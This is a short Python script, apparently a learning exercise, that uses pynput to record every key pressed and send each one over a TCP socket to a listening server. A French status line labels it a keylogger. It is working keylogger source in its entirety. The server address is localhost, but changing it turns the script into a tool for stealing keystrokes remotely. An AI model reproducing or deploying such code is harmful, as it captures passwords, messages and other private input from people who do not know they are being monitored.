from pynput.keyboard import Key, Listener
import socket

def on_press(key, client_socket):
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
        client_socket.send(str(key).encode())
    except AttributeError:
        print('special key {0} pressed'.format(key))
        client_socket.send(str(key).encode())

def start_client():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('localhost', 12345)
    client_socket.connect(server_address)
    print("Connect√© au serveur comme un keylogger")

    with Listener(
            on_press=lambda event: on_press(event, client_socket)) as listener:
        listener.join()

start_client()